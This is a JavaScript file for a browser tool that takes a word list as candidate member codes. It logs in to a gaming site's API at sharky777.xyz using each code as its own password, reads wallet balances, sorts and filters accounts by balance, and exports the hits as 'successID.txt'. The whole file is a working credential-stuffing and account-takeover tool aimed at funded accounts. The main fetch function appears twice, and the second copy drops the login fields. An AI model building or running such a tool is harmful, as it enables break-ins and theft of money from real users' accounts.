async function fetchAndDisplayData() {
    try {
        const wordListElement = document.getElementById('wordList');
        const usernames = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent);

        if (usernames.length === 0) {
            console.error('No usernames found in the generated word list');
            alert('No usernames found in the generated word list');
            return;
        }

        for (const membercode of usernames) {
            console.log(`Processing membercode: ${membercode}`);

            // Fetch token
            const tokenResponse = await fetch('https://feapi.sharky777.xyz/api/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    membercode: membercode,
                    password: membercode,
                    platform: "desktop",
                    option: "2",
                    domain: "https://hckrxyzz.github.io"
                })
            });

            if (!tokenResponse.ok) {
                console.error(`Failed to fetch token for membercode: ${membercode}`);
                continue; // Skip to the next username
            }

            const tokenData = await tokenResponse.json();
            const authToken = tokenData.access_token;

            // Fetch member details
            const dataResponse = await fetch('https://feapi.sharky777.xyz/api/member/details', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${authToken}`
                }
            });

            if (!dataResponse.ok) {
                console.error(`Failed to fetch data for membercode: ${membercode}`);
                continue; // Skip to the next username
            }

            const jsonData = await dataResponse.json();
            populateTable(jsonData);
        }

        console.log('Finished processing all usernames.');
        alert('Finished processing all usernames.');
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

function populateTable(data) {
    const tableBody = document.getElementById('table-body');
    const wallets = data.data.wallets;

    wallets.forEach(wallet => {
        const row = document.createElement('tr');

        // Add member code
        const memberCodeCell = document.createElement('td');
        memberCodeCell.textContent = data.data.membercode;
        row.appendChild(memberCodeCell);

        // Add balance
        const balanceCell = document.createElement('td');
        balanceCell.textContent = wallet.balance;
        row.appendChild(balanceCell);

        // Add gaming site name
        const siteNameCell = document.createElement('td');
        siteNameCell.textContent = wallet.localization[0].en;
        row.appendChild(siteNameCell);

        // Add details button
        const detailsCell = document.createElement('td');
        const detailsButton = document.createElement('button');
        detailsButton.textContent = 'Details';
        detailsButton.className = 'w3-btn w3-red';
        detailsCell.appendChild(detailsButton);
        row.appendChild(detailsCell);

        tableBody.appendChild(row);
    });
}

function generateWordList() {
    const text = document.getElementById('textInput').value;
    const fileInput = document.getElementById('fileInput');
    let words = text.split(/\s+/).filter(word => word);

    if (fileInput.files.length > 0) {
        const file = fileInput.files[0];
        const reader = new FileReader();
        reader.onload = function (e) {
            const fileText = e.target.result;
            words = words.concat(fileText.split(/\s+/).filter(word => word));
            processWords(words);
        };
        reader.readAsText(file);
    } else {
        processWords(words);
    }
}

function cleanWords(words) {
    const cleanedWords = [];
    words.forEach(word => {
        const splitWords = word.replace(/[^\w\s]/g, ' ').split(/\s+/).filter(w => w);
        cleanedWords.push(...splitWords);
    });
    return cleanedWords;
}

function processWords(words) {
    const cleanedWords = cleanWords(words);
    const uniqueWords = [...new Set(cleanedWords)];
    uniqueWords.sort();
    const wordListElement = document.getElementById('wordList');
    wordListElement.innerHTML = '';
    uniqueWords.forEach(word => {
        const li = document.createElement('li');
        li.textContent = word;
        wordListElement.appendChild(li);
    });
}

function removeDuplicates() {
    const wordListElement = document.getElementById('wordList');
    const uniqueWords = [...new Set(Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent))];
    wordListElement.innerHTML = '';
    uniqueWords.forEach(word => {
        const li = document.createElement('li');
        li.textContent = word;
        wordListElement.appendChild(li);
    });
}

function sortWordListAscending() {
    const wordListElement = document.getElementById('wordList');
    const words = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent);
    words.sort();
    wordListElement.innerHTML = '';
    words.forEach(word => {
        const li = document.createElement('li');
        li.textContent = word;
        wordListElement.appendChild(li);
    });
}

function downloadUsernames() {
    const wordListElement = document.getElementById('wordList');
    const usernames = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent).join('\n');
    const blob = new Blob([usernames], {
        type: 'text/plain'
    });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'successID.txt';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

document.getElementById('clearButton').addEventListener('click', function () {
    document.getElementById('wordList').innerHTML = '';
    document.getElementById('output').innerHTML = '';
    document.getElementById('textInput').value = '';
    document.getElementById('errorOutput').innerHTML = '';
});

function logMessage(message) {
    const output = document.getElementById('output');
    output.textContent += message + '\n';
}

document.addEventListener('DOMContentLoaded', () => {
    const downloadButton = document.getElementById('downloadButton');
    downloadButton.textContent = 'Download';
    downloadButton.onclick = downloadUsernames;
});

let stopFetching = false;

function stopFetchAndDisplayData() {
    stopFetching = true;
    console.log('Fetching process stopped.');
}

async function fetchAndDisplayData() {
    stopFetching = false; // Reset stop flag
    try {
        const wordListElement = document.getElementById('wordList');
        const usernames = Array.from(wordListElement.querySelectorAll('li')).map(li => li.textContent);

        if (usernames.length === 0) {
            console.error('No usernames found in the generated word list');
            alert('No usernames found in the generated word list');
            return;
        }

        for (const membercode of usernames) {
            if (stopFetching) {
                console.log('Fetching process interrupted.');
                break;
            }

            console.log(`Processing membercode: ${membercode}`);

            // Fetch token
            const tokenResponse = await fetch('https://feapi.sharky777.xyz/api/token', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    domain: "https://hckrxyzz.github.io"
                })
            });

            if (!tokenResponse.ok) {
                console.error(`Failed to fetch token for membercode: ${membercode}`);
                continue; // Skip to the next username
            }

            const tokenData = await tokenResponse.json();
            const authToken = tokenData.access_token;

            // Fetch member details
            const dataResponse = await fetch('https://feapi.sharky777.xyz/api/member/details', {
                method: 'GET',
                headers: {
                    'Authorization': `Bearer ${authToken}`
                }
            });

            if (!dataResponse.ok) {
                console.error(`Failed to fetch data for membercode: ${membercode}`);
                continue; // Skip to the next username
            }

            const jsonData = await dataResponse.json();
            populateTable(jsonData);
        }

        console.log('Finished processing all usernames.');
        alert('Finished processing all usernames.');
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

function sortTableByBalance() {
    const table = document.getElementById('table-body');
    const rows = Array.from(table.rows);

    rows.sort((a, b) => {
        const BalanceA = parseFloat(a.cells[1].innerText) || 0;
        const BalanceB = parseFloat(b.cells[1].innerText) || 0;

        return BalanceB - BalanceA;
    });

    rows.forEach(row => table.appendChild(row)); // Reorder rows in the table
}
sortTableByBalance();
function removeRowsWithLowBalance() {
    const table = document.getElementById('table-body');
    const rows = Array.from(table.rows);

    rows.forEach(row => {
        const balance = parseFloat(row.cells[1].innerText) || 0;
        if (balance < 1) {
            table.removeChild(row);
        }
    });
}

removeRowsWithLowBalance();
function formatBalances() {
    const table = document.getElementById('table-body');
    const rows = Array.from(table.rows);

    rows.forEach(row => {
        const balanceCell = row.cells[1];
        const balance = parseFloat(balanceCell.innerText) || 0;
        balanceCell.innerText = balance.toFixed(2);
    });
}

formatBalances();
